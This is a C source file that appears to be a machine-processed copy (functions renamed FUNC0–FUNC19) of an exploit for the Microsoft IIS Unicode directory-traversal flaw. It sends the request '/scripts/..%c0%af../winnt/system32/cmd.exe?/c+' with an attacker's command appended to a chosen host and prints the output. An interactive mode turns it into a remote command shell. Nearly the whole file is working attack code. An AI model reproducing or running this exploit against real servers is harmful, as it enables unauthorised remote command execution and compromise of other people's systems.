#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
struct sockaddr_in {int /*<<< orphan*/  sin_addr; int /*<<< orphan*/  sin_port; int /*<<< orphan*/  sin_family; } ;
struct sockaddr {int dummy; } ;
struct hostent {scalar_t__ h_addr; } ;
typedef  int /*<<< orphan*/  s_addr ;
typedef  int /*<<< orphan*/  request ;
typedef  int /*<<< orphan*/  host ;
typedef  int /*<<< orphan*/  cmd ;

/* Variables and functions */
 int /*<<< orphan*/  IPPROTO_TCP ; 
 int /*<<< orphan*/  PF_INET ; 
 int /*<<< orphan*/  SOCK_STREAM ; 
 int /*<<< orphan*/  FUNC0 (int) ; 
 int FUNC1 (char*) ; 
 int /*<<< orphan*/  FUNC2 (int) ; 
 int FUNC3 (int,struct sockaddr*,int) ; 
 int /*<<< orphan*/  FUNC4 (int) ; 
 int /*<<< orphan*/ * FUNC5 (char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ,char*,...) ; 
 struct hostent* FUNC7 (char*) ; 
 int /*<<< orphan*/  FUNC8 (int) ; 
 int /*<<< orphan*/  FUNC9 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC10 (char*,...) ; 
 scalar_t__ FUNC11 (int,char*,int,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC12 (int,char*,int,int /*<<< orphan*/ ) ; 
 int FUNC13 (int /*<<< orphan*/ ,int /*<<< orphan*/ ,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  stderr ; 
 int /*<<< orphan*/  stdin ; 
 int /*<<< orphan*/  FUNC14 (char*,char*) ; 
 int FUNC15 (char*) ; 
 int /*<<< orphan*/  FUNC16 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC17 (char*,char*,int) ; 
 int /*<<< orphan*/  FUNC18 () ; 

int FUNC19(int argc, char **argv) 
{
 int i, j;
 int port=80;
 int timeout=3;
 int interactive=0;
 char temp[1];
 char host[512]=""; 
 char cmd[1024]="";
 char request[8192]="GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+";
 struct hostent *he;
 struct sockaddr_in s_addr;

 FUNC10("iis-zank_bread_chafer_8000_super_alpha_hyper_pickle.c\n");
 FUNC10("by optyx and t12\n");

 for(i=0;i<argc;i++) 
	{ if(argv[i][0] == '-') {
		 for(j=1;j<FUNC15(argv[i]);j++) 
		 	{
			 switch(argv[i][j]) 
			 	{
				 case 't':
				 	FUNC17(host, argv[i+1], sizeof(host));
				 	break;
				 case 'c':
				 	FUNC17(cmd, argv[i+1], sizeof(cmd));
				 	break;
				 case 'h':
				 	FUNC18();
			 	 	break;
				 case 'o':
					timeout=FUNC1(argv[i+1]); 
				 	break;
				 case 'p':
				 	port=FUNC1(argv[i+1]);
				 	break;
				 case 'i':
				 	interactive=1;
				 	break;
				 default:
				 break;
				}
			}
		}
	}

 if(!FUNC14(host, "")) 
	{
	 FUNC6(stderr, "specify target host\n");
	 FUNC18();
	}

 if(!FUNC14(cmd, "") && !interactive) 
	{
	 FUNC6(stderr, "specify command to execute\n");
	 FUNC18();
	}

 FUNC10("]- Target - %s:%d\n", host, port);
 if(!interactive)
 	 FUNC10("]- Command - %s\n", cmd);
 FUNC10("]- Timeout - %d seconds\n", timeout);
 if((he=FUNC7(host)) == NULL) 
	{
 	 FUNC6(stderr, "invalid target\n");
	 FUNC18();
	}

 do
 	{

	 if(interactive)
	 	 {
		  cmd[0]=0;
		  FUNC10("\nC> ");
		  if(FUNC5(cmd, sizeof(cmd), stdin) == NULL)
		  	  FUNC6(stderr, "gets() error\n"); 
		  cmd[FUNC15(cmd)-1]='\0';
		  if(!FUNC14("exit", cmd))
		  	  FUNC4(-1);
		 }

 	 for(i=0;i<FUNC15(cmd);i++) 
		 {
	 	  if(cmd[i]==' ')
		  	cmd[i]='+';
		 }

	 FUNC17(request, 
		   "GET /scripts/..%c0%af../winnt/system32/cmd.exe?/c+",
		   sizeof(request));
 	 FUNC16(request, cmd, sizeof(request) - strlen(request) - 1);	
 	 FUNC16(request, "\n", sizeof(request) - strlen(request) - 1);

 	 s_addr.sin_family = PF_INET;
 	 s_addr.sin_port = FUNC8(port);
 	 FUNC9((char *) &s_addr.sin_addr, (char *) he->h_addr, 
 		sizeof(s_addr.sin_addr));	

 	 if((i=FUNC13(PF_INET, SOCK_STREAM, IPPROTO_TCP)) == -1) 
		 {
	 	  FUNC6(stderr, "cannot create socket\n");
	 	  FUNC4(-1);
		 }

 	 FUNC0(timeout);
 	 j = FUNC3(i, (struct sockaddr *) &s_addr, sizeof(s_addr));
 	 FUNC0(0);

 	 if(j==-1) 
		 {
	 	  FUNC6(stderr, "cannot connect to %s\n", host);
	 	  FUNC4(-1);
	 	  FUNC2(i);
		 }

	 if(!interactive)
 	 	  FUNC10("]- Sending request: %s\n", request);

 	 FUNC12(i, request, FUNC15(request), 0);

	 if(!interactive)
 	 	  FUNC10("]- Getting results\n");

 	 while(FUNC11(i,temp,1, 0)>0) 
		 {
         	  FUNC0(timeout);
	 	  FUNC10("%c", temp[0]);
         	  FUNC0(0);
		 }	

  }
  while(interactive);

  FUNC2(i);	
  return 0;
}